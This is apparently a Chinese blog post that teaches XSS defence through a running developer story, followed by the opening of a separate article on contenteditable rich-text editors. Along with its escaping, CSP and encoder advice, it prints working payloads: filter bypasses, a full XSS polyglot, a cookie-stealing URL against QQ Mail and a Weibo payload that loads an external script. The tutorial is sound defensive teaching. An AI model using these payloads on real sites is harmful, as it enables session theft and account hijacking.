中返回给浏览器。形成了如下的 HTML： 123456789101112&lt;input type=&quot;text&quot; value=&quot;&quot; /&gt;&lt;script&gt; alert(&quot;XSS&quot;);&lt;/script&gt;&quot;&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&quot;&gt; &lt;script&gt; alert(&quot;XSS&quot;); &lt;/script&gt;&lt;/div&gt; 浏览器无法分辨出 &lt;script&gt;alert('XSS');&lt;/script&gt; 是恶意代码，因而将其执行。 这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。 面对这种情况，我们应该如何进行防范呢？ 其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。 聪明的小明很快找到解决方法，把这个漏洞修复： 123&lt;input type=&quot;text&quot; value=&quot;&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;&quot;&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt;您搜索的关键词是：&lt;%= escapeHTML(getParameter(&quot;keyword&quot;)) %&gt;&lt;/div&gt; escapeHTML() 按照如下规则进行转义： 字符 转义后的字符 &amp; &amp;amp; &lt; &amp;lt; &gt; &amp;gt; &quot; &amp;quot; ' &amp;#x27; / &amp;#x2F; 经过了转义函数的处理后，最终浏览器接收到的响应为： 12345678&lt;input type=&quot;text&quot; value='&quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;'/&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&lt;/div&gt; 恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。 通过这个事件，小明学习到了如下知识： 通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。 攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。 攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。 通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。 注意特殊的 HTML 属性、JavaScript API自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。 但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。 不久，小明又收到安全组的神秘链接：http://xxx/?redirect_to=javascript:alert('XSS')。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。 小明打开对应页面的源码，发现有以下内容： 1&lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;)) %&gt;&quot;&gt;跳转...&lt;/a&gt; 这段代码，当攻击 URL 为 http://xxx/?redirect_to=javascript:alert('XSS')，服务端响应就成了： 1&lt;a href=&quot;javascript:alert(&amp;#x27;XSS&amp;#x27;)&quot;&gt;跳转...&lt;/a&gt; 虽然代码不会立即执行，但一旦用户点击 a 标签时，浏览器会就会弹出“XSS”。 可恶，又失策了… 在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。 原来不仅仅是特殊字符，连 javascript: 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。 小明眉头一皱，想到了解决办法： 1234567891011// 禁止 URL 以 &quot;javascript:&quot; 开头xss = getParameter(&quot;redirect_to&quot;).startsWith('javascript:');if (!xss) { &lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;))%&gt;&quot;&gt; 跳转... &lt;/a&gt;} else { &lt;a href=&quot;/404&quot;&gt; 跳转... &lt;/a&gt;} 只要 URL 的开头不是 javascript:，就安全了吧？ 安全组随手又扔了一个连接：http://xxx/?redirect_to=jAvascRipt:alert('XSS') 这也能执行？…..好吧，浏览器就是这么强大。 小明欲哭无泪，在判断 URL 开头是否为 javascript: 时，先把用户输入转成了小写，然后再进行比对。 不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接： http://xxx/?redirect_to=%20javascript:alert('XSS') %20javascript:alert('XSS') 经过 URL 解析后变成 javascript:alert('XSS')，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。 最终，小明选择了白名单的方法，彻底解决了这个漏洞： 1234567891011121314// 根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等allowSchemes = [&quot;http&quot;, &quot;https&quot;];valid = isValid(getParameter(&quot;redirect_to&quot;), allowSchemes);if (valid) { &lt;a href=&quot;&lt;%= escapeHTML(getParameter(&quot;redirect_to&quot;))%&gt;&quot;&gt; 跳转... &lt;/a&gt;} else { &lt;a href=&quot;/404&quot;&gt; 跳转... &lt;/a&gt;} 通过这个事件，小明学习到了如下知识： 做了 HTML 转义，并不等于高枕无忧。 对于链接跳转，如 &lt;a href=&quot;xxx&quot; 或 location.href=&quot;xxx&quot;，要检验其内容，禁止以 javascript: 开头的链接，和其他非法的 scheme。 根据上下文采用不同的转义规则某天，小明为了加快网页的加载速度，把一个数据通过 JSON 的方式内联到 HTML 中： 123&lt;script&gt; var initData = &lt;%= data.toJSON() %&gt;&lt;/script&gt; 插入 JSON 的地方不能使用 escapeHTML()，因为转义 &quot; 后，JSON 格式会被破坏。但安全组又发现有漏洞，原来这样内联 JSON 也是不安全的： 当 JSON 中包含 U+2028 或 U+2029 这两个字符时，不能作为 JavaScript 的字面量使用，否则会抛出语法错误。 当 JSON 中包含字符串 &lt;/script&gt; 时，当前的 script 标签将会被闭合，后面的字符串内容浏览器会按照 HTML 进行解析；通过增加下一个 &lt;script&gt; 标签等方法就可以完成注入。 于是我们又要实现一个 escapeEmbedJSON() 函数，对内联 JSON 进行转义。 转义规则如下： 字符 转义后的字符 U+2028 \\u2028 U+2029 \\u2029 &lt; \\u003c 修复后的代码如下： 12&lt;script&gt;var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt; 通过这个事件，小明学习到了如下知识： HTML 转义是非常复杂的，在不同的情况下要采用不同的转义规则。如果采用了错误的转义规则，很有可能会埋下 XSS 隐患。 应当尽量避免自己写转义库，而应当采用成熟的、业界通用的转义库。 漏洞总结小明的例子讲完了，下面我们来系统的看下 XSS 有哪些注入的方法： 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。 在 onload、onerror、onclick 等事件中，注入不受控制代码。 在 style 属性和标签中，包含类似 background-image:url(&quot;javascript:...&quot;); 的代码（新版本浏览器已经可以防范）。 在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。 总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。 XSS 攻击的分类通过上述几个例子，我们已经对 XSS 有了一些认识。 什么是 XSSCross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。 XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。 而由于直接在用户的终端执行，恶意代码能够直接获取用户的信息，或者利用这些信息冒充用户向网站发起攻击者定义的请求。 在部分情况下，由于输入的限制，注入的恶意脚本比较短。但可以通过引入外部的脚本，并由浏览器执行，来完成比较复杂的攻击策略。 这里有一个问题：用户是通过哪种方法“注入”恶意脚本的呢？ 不仅仅是业务上的“用户的 UGC 内容”可以进行注入，包括 URL 上的参数等都可以是攻击的来源。在处理输入时，以下内容都不可信： 来自用户的 UGC 信息 来自第三方的链接 URL 参数 POST 参数 Referer （可能来自不可信的来源） Cookie （可能来自其他子域注入） XSS 分类根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。 类型 存储区 插入点 存储型 XSS 后端数据库 HTML 反射型 XSS URL HTML DOM 型 XSS 后端数据库/前端存储/URL 前端 JavaScript 存储区：恶意代码存放的位置。 插入点：由谁取得恶意代码，并插入到网页上。 存储型 XSS存储型 XSS 的攻击步骤： 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。 反射型 XSS反射型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。 反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。 由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。 DOM 型 XSSDOM 型 XSS 的攻击步骤： 攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。 XSS 攻击的预防通过前面的介绍可以得知，XSS 攻击有两大要素： 攻击者提交恶意代码。 浏览器执行恶意代码。 针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？ 输入过滤在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？ 答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。 那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？ 我们举一个例子，一个正常的用户输入了 5 &lt; 7 这个内容，在写入数据库前，被转义，变成了 5 &amp;lt; 7。 问题是：在提交阶段，我们并不确定内容要输出到哪里。 这里的“并不确定内容要输出到哪里”有两层含义： 用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 &amp;lt; 7 )。 在前端中，不同的位置所需的编码也不同。 当 5 &amp;lt; 7 作为 HTML 拼接页面时，可以正常显示： 1&lt;div title=&quot;comment&quot;&gt;5 &amp;lt; 7&lt;/div&gt; 当 5 &amp;lt; 7 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。 所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。 既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类： 防止 HTML 中出现注入。 防止 JavaScript 执行时，执行恶意代码。 预防存储型和反射型 XSS 攻击存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。 预防这两种漏洞，有两种常见做法： 改成纯前端渲染，把代码和数据分隔开。 对 HTML 做充分转义。 纯前端渲染纯前端渲染的过程： 浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。 然后浏览器执行 HTML 中的 JavaScript。 JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。 在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。 但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。 在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。 转义 HTML如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 doT.js、ejs、FreeMarker 等，对于 HTML 转义通常只有一个规则，就是把 &amp; &lt; &gt; &quot; ' / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善： XSS 安全漏洞 简单转义是否有防护作用 HTML 标签文字内容 有 HTML 属性值 有 CSS 内联样式 无 内联 JavaScript 无 内联 JSON 无 跳转链接 无 所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。 例如 Java 工程里，常用的转义库为 org.owasp.encoder。以下代码引用自 org.owasp.encoder 的官方说明。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!-- HTML 标签内文字内容 --&gt;&lt;div&gt;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&lt;/div&gt;&lt;!-- HTML 标签属性值 --&gt;&lt;input value=&quot;&lt;%= Encode.forHtml(UNTRUSTED) %&gt;&quot; /&gt;&lt;!-- CSS 属性值 --&gt;&lt;div style=&quot;width:&lt;= Encode.forCssString(UNTRUSTED) %&gt;&quot;&gt; &lt;!-- CSS URL --&gt; &lt;div style=&quot;background:&lt;= Encode.forCssUrl(UNTRUSTED) %&gt;&quot;&gt; &lt;!-- JavaScript 内联代码块 --&gt; &lt;script&gt; var msg = &quot;&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;&quot;; alert(msg); &lt;/script&gt; &lt;!-- JavaScript 内联代码块内嵌 JSON --&gt; &lt;script&gt; var __INITIAL_STATE__ = JSON.parse( &quot;&lt;%= Encoder.forJavaScript(data.to_json) %&gt;&quot; ); &lt;/script&gt; &lt;!-- HTML 标签内联监听器 --&gt; &lt;button onclick=&quot;alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');&quot;&gt; click me &lt;/button&gt; &lt;!-- URL 参数 --&gt; &lt;a href=&quot;/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top&quot; &gt; &lt;!-- URL 路径 --&gt; &lt;a href=&quot;/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&quot;&gt; &lt;!-- URL. 注意：要根据项目情况进行过滤，禁止掉 &quot;javascript:&quot; 链接、非法 scheme 等 --&gt; &lt;a href='&lt;%= urlValidator.isValid(UNTRUSTED) ? Encode.forHtml(UNTRUSTED) : &quot;/404&quot; %&gt;' &gt; link &lt;/a&gt; &lt;/a&gt; &lt;/a&gt; &lt;/div&gt;&lt;/div&gt; 可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。 预防 DOM 型 XSS 攻击DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。 如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。 DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，&lt;a&gt; 标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。 1234567891011121314151617&lt;!-- 内联事件监听器中包含恶意代码 --&gt;&lt;img onclick=&quot;UNTRUSTED&quot; onerror=&quot;UNTRUSTED&quot; src=&quot;data:image/png,&quot; /&gt;&lt;!-- 链接内包含恶意代码 --&gt;&lt;a href=&quot;UNTRUSTED&quot;&gt;1&lt;/a&gt;&lt;script&gt; // setTimeout()/setInterval() 中调用恶意代码 setTimeout(&quot;UNTRUSTED&quot;); setInterval(&quot;UNTRUSTED&quot;); // location 调用恶意代码 location.href = &quot;UNTRUSTED&quot;; // eval() 中调用恶意代码 eval(&quot;UNTRUSTED&quot;);&lt;/script&gt; 如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。 其他 XSS 防范措施虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。 Content Security Policy严格的 CSP 在 XSS 的防范中可以起到以下的作用： 禁止加载外域代码，防止复杂的攻击逻辑。 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。 合理使用上报可以及时发现 XSS，利于尽快修复问题。 关于 CSP 的详情，请关注前端安全系列后续的文章。 输入内容长度控制对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。 其他安全措施 HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。 验证码：防止脚本冒充用户提交危险操作 XSS 的检测上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？ 经过一番搜索，小明找到了两个方法： 使用通用 XSS 攻击字符串手动检测 XSS 漏洞。 使用扫描工具自动检测 XSS 漏洞。 在Unleashing an Ultimate XSS Polyglot一文中，小明发现了这么一个字符串： 1jaVasCript:/*-/*`/*\\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\x3e 它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write() 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。 小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。 1http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E 除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 Arachni、Mozilla HTTP Observatory、w3af 等。 XSS 攻击的总结我们回到最开始提出的问题，相信同学们已经有了答案： XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 不正确。因为： 防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。 转义应该在输出 HTML 时进行，而不是在提交用户输入时。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 不正确。 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。 整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。 虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生： 利用模板引擎 开启模板引擎自带的 HTML 转义功能。例如：在 ejs 中，尽量使用 &lt;%= data %&gt; 而不是 &lt;%- data %&gt;；在 doT.js 中，尽量使用 {{! data }` 而不是 `{{= data }`；在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 `freemarker.core.OutputFormat`。 - **避免内联事件** 尽量不要使用 `onLoad=\"onload('{{data}}')&quot;、onClick=&quot;go('{{action}}')&quot; 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。 避免拼接 HTML 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。 时刻保持警惕 在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。 增加攻击难度，降低攻击后果 通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。 主动检测和发现 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。 XSS 攻击案例QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。 于是攻击者构建出一个 URL，并引导用户去点击：http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B 用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中： 1234567891011&lt;script&gt; getTop().location.href = &quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa&quot; + &quot;&amp;t=&quot; + &quot;&amp;d=bbbb&quot;; return false;&lt;/script&gt;&lt;script&gt; alert(document.cookie);&lt;/script&gt;&quot;+&quot;... 浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。 新浪微博名人堂反射型 XSS 漏洞攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。 于是攻击者构建出一个 URL，然后诱导用户去点击：http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt; 用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中： 1&lt;li&gt;&lt;a href=&quot;http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;&quot;&gt;按分类检索&lt;/a&gt;&lt;/li&gt; 浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。 扩展阅读：Automatic Context-Aware Escaping上文我们说到： 合适的 HTML 转义可以有效避免 XSS 漏洞。 完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。 业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。 通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。 2009 年，Google 提出了一个概念叫做：Automatic Context-Aware Escaping。 所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。 在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;title&gt;{{.title}}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;{{.url}}&quot;&gt;{{.content}}&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则： 123456789&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;title&gt;{{.title | htmlescaper}}&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;{{.url | urlescaper | attrescaper}}&quot;&gt;{{.content | htmlescaper}}&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 目前已经支持 Automatic Context-Aware Escaping 的模板引擎有： go html/template Google Closure Templates","link":"/front-end/how_xss/"},{"title":"深入浅出 contenteditable 富文本编辑器","text":"富文本编辑器一直是前端领域的一个天坑，但若不是深入接触编辑器开发的工程师，却不一定清楚富文本编辑器到底坑在哪里，作为有幸和编辑器打了一年交道的前端，今天来聊聊 Web 富文本编辑器的那些事。 作者：Dean hong链接：https://zhuanlan.zhihu.com/p/37051858 通常当我们拿到一个带有富文本编辑器的需求时，我们首先要理清这个需求的使用场景，然后我们可以为这些具体的业务场景选择一款合适的开源富文本编辑器，进行定制开发。看看目前市面上我们可以选择的开源编辑器的实现方式，大致分为两种： 基于 HTML DOM 的 Contenteditable 属性来实现代表如 UEditor、TinyMCE、Quill 这是使用最久的传统富文本编辑器实现方式，这种实现方式的优势很明显，contenteditable 是浏览器 Dom 的一个原生属性，值为 true 时表示该元素变为可编辑状态。因此原生就直接支持很多内容编辑操作，包括光标位移、内容选择的行为、键盘事件（如方向键控制光标）等等，甚至是富文本编辑所需要用到的绝大部分实现（document.execCommand） 这些原生支持使得性能和输入体验都非常棒，在此基础之上进行二次开发看起来相当容易，辅以 iframe 技术，可以将编辑器放在一个独立的 docment 对象下，与页面的 document 对象分离 缺点也非常要命，以 why-contenteditable-is-terrible 为代表的文章，几乎说明了一切，总结下来无非是：浏览器兼容性差、用户行为难以控制、难以抽象编辑器内的视图逻辑关系并将它们映射到代码模型中（试想一下你要抽象一个变化规则不可掌控的可变 Dom 结构的逻辑关系）、光标（选区）的视觉位置与逻辑位置可能不吻合 基于自定义 Model 的实现代表如：draft.js、trix 这种实现方式，简单的来说就是定义一套编辑器内部使用的数据结构（model），与用户在编辑器内所见的 Dom 视图相映射；通过捕获用户的操作行为，由原先的直接操作 Dom，改为更新数据结构状态，再将更新后的状态映射至视图的方式，来实现编辑器的所见即所得，显然操作行为对数据结构的更新是非常可控的 这是一种十分先进的编辑器设计理念，它几乎抛弃了 contenteditable 的特性，这也意味着 contenteditable 所带来的副作用都消失了 这种实现方式的另一个好处在于，它可以适用于多人在线协作的业务场景。由于用户操作实际影响的是内部的数据结构，且每次操作产生的结果都被控制在一定范围内（只影响部分节点），可以较为容易的通过锁和 diff 算法来合并短时间内的多次修改。 看起来这显然是一个比 contenteditable 编辑器更好的选择 遗憾的是目前这种实现方式的开源编辑器可供选择的并不多，实际情况中可能并不能满足所有的开发场景，比如 draft.js 只能基于 react 而且并非开箱即用，而如 trix 这样相对小众的项目在国内则有些水土不服（别问我怎么知道的），如果你目前使用的不是 react 或者就想要一个开箱即用的编辑器去做定制，又没有条件自己造个轮子，在不需要考虑多人协作场景的情况下，我们依然可以从 contenteditable 编辑器上寻求突破 回过头来看看 contenteditable 编辑器，现实情况其实也没有那么糟糕，毕竟这是使用最为广泛的一种实现方式，拥有大量的实践，这些成熟的开源项目早已为我们提供了解决方案 来看看它们是怎么做的吧以国内熟知的 UEditor 为例（也是微信公众号所用的编辑器），它的核心提供了这么几样东西 dtd 规则：用来规定编辑器内的 dom 嵌套规则，和过滤方法搭配使用，避免出现 &lt;span&gt;&lt;p&gt;xxx&lt;/p&gt;&lt;/span&gt; uNode 对象：根据 HTML DOM 抽象而成的文档模型对象，抽象了 dom 的属性和层级关系，保留了一些 dom 操作的方法（与第二种实现方式的自定义 model 类似），将编辑器内容的 HTML 映射过来之后可以很方便的执行规则过滤，如剔除冗余属性和非白名单标签等 Range 对象：光标和选区的信息对象，记录了 当前光标（选区）的开始、结束边界的容器节点和偏移量以及当前光标（选区）的闭合状态，还提供了一系列对光标（选区）操作的 API EventBase：提供注册、销毁和触发自定义事件监听器的方法，用来生成一些钩子 execCommand 指令集：document.execCommand 增强版，执行指令的通用接口，富文本格式操作的核心，提供了一系列指定命令的执行和状态查询方法（如对选区内容执行字体加粗命令、查询当前选区内容是否处于加粗状态） undoManager：撤销重做的堆栈，记录内容变化过程 domUtils：Dom 操作方法集 可以利用上面这些核心方法组合出一些实用的工具，比如在 UEditor 中非常重要的过滤规则体系，就是利用了 eventBase 与 uNode 的组合实现的（通过对 eventbase 